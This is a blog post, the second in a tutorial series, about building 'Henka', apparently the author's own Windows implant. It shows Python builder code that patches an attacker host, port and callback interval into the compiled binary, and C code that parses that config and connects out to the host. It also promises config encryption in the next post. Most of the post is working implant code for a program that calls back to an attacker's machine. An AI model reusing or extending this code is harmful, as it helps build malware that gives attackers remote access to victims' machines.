---
layout: post
title: Henka In-depth! Part 2
date: 2024-02-01
---

---

# **Previous Post**

- **[Previous](https://nuker.github.io/2024/02/01/Henka-In-depth-1.html)**

> **In the last post we went over the basic functionality of Henka**
> **now we are going to pick it apart and understand what it really is doing.**

# **builder.py**

> **[builder.py](https://github.com/nuker/Henka/blob/main/modules/builder.py) is the main file for taking in the cli arguments,**
> **and forming them into a config to be placed inside of the binary lets take a look**

> **The first config creation mode is Quick this is just placing a plain config within the buffer**

```python

class Build(ABC):

	def __init__(self, ip: str, port: int, interval: int):

		self.ip = ip
		self.port = port
		self.interval = interval

	@abstractmethod
	def patch(self):
		pass
```

```python

class Quick(Build):

	# Plain jane

	def patch(self):

		if self.interval == None:
			self.interval = 5

		print(dim + gre + f"[#] Mode: Quick")
		print(dim + gre + f"[#] Config Address: {self.ip}")
		print(dim + gre + f"[#] Config Port: {self.port}")
		print(dim + gre + f"[#] Config Interval {self.interval}")

		config = b""
		config += self.ip.encode("UTF-8")
		config += b"-"
		config += str(self.port).encode("UTF-8")
		config += b"-"
		config += str(self.interval).encode("UTF-8")
		config += b"-"

		with open("bundle/win/bin/Henka.exe", "r+b") as Henka:

			# Get offset to config

			bHenka = Henka.read()
			offset = bHenka.find(b"HENKA-") + 6

			# Write config

			Henka.seek(offset)
			Henka.write(config)
```

> **For newer python people I will break the code down**

> **At the start of our patch function we check if there as a -c option supplied**
> **if not, we set a default which is 5 seconds**

```python
	if self.interval == None:
		self.interval = 5
```

> **Printing the values to the screen**

```python
	print(dim + gre + f"[#] Mode: Quick")
	print(dim + gre + f"[#] Config Address: {self.ip}")
	print(dim + gre + f"[#] Config Port: {self.port}")
	print(dim + gre + f"[#] Config Interval {self.interval}")
```

> **Next I start creating a config which is just a string of bytes in our case.**
> **Note how I am seperating each value of the config with "-" this will become VERY important later**
> **as this is how we will parse our config**

```python
	config = b""
	config += self.ip.encode("UTF-8")
	config += b"-"
	config += str(self.port).encode("UTF-8")
	config += b"-"
	config += str(self.interval).encode("UTF-8")
	config += b"-"
```

> **The last thing is to place the formed config inside of the buffer**

```python

	with open("bundle/win/bin/Henka.exe", "r+b") as Henka:

			# Get offset to config

			bHenka = Henka.read()
			offset = bHenka.find(b"HENKA-") + 6

			# Write config

			Henka.seek(offset)
			Henka.write(config)
```
> **I am opening the Henka binary with open (literally haha) and reading the bytes with ".read()"**
> **with the bytes of the file stored in a variable we can use the ".find()" method to**
> **search for the start of our config "HENKA-" once ".find()" has found the latter**
> **it will return an integer indicating how many bytes from the start of the file our config is it aka (the offset)**
> **once we have found the offset to the config buffer we add 6 to it because that is the length of "HENKA-"**

> **We want our cursor to be HENKA-_ <------- Here**

>**This is done with [.seek()](https://www.geeksforgeeks.org/python-seek-function/)**

> In Python, seek() function is used to change the position of the File Handle to a given specific position. File handle is like a cursor, which defines from where the data has to be read or written in the file. 

```python
Henka.seek(offset)
```

> **The final thing to do is place the config in the buffer**

```python
Henka.write(config)
```
# **Bin again?**

> **Now that we understand how our config is created and how it is placed**
> **inside of the binary. Let's understand how the config is parsed and ultimately**
> **used to complete our goal.**

> **Here is the code for parsing the config**

- **[config.c](https://github.com/nuker/Henka/blob/main/bundle/win/src/config.c)**

```c
#include "../inc/config.h"

/*
	(Mode 1) Default config creation
*/

void Make_config(PCONFIG Config, unsigned char *Buff) {

	unsigned char *Host;
	unsigned char *Port;
	unsigned char *Interval;

	strtok(Buff, "-");

	// Default

	Host = strtok(NULL, "-"); // Get to host
	Config->Host = Host;

	Port = strtok(NULL, "-"); // Get to port
	Config->Port = atoi(Port);

	Interval = strtok(NULL, "-"); // Get to callback
	Config->Interval = atoi(Interval);

}
```
> **Remember how we seperated (tokenized) our config values with "-" ?**
> **We can use [strtok()](https://www.tutorialspoint.com/c_standard_library/c_function_strtok.htm) to tokenize (split) each value and populate our struct values.**

> **Once the config is made we can access the values from our struct that we passed to Make_config and connect to the socket**

- **[Henka.c](https://github.com/nuker/Henka/blob/main/bundle/win/src/Henka.c)**

```c

    // Config creation

    PCONFIG Conf = (PCONFIG)malloc(sizeof(PCONFIG));

    Make_config(Conf, CBUFF);

    WSAStartup(MAKEWORD(2,2), &wsa);

    s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    ZeroMemory(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(Conf->Port);
    addr.sin_addr.s_addr = inet_addr(Conf->Host);

    int conn = connect(s, (struct sockaddr *)&addr, sizeof(addr));

```
> **You may also wonder why I am allocating memory (malloc()) for the struct and that is what we will get into next...**

# **Next Post**

- **[Next Post](https://nuker.github.io/)**

> **In the next post I will be going over the development of**

- **Encrypting the config**
- **Decrypting the config to the memory we allocated**





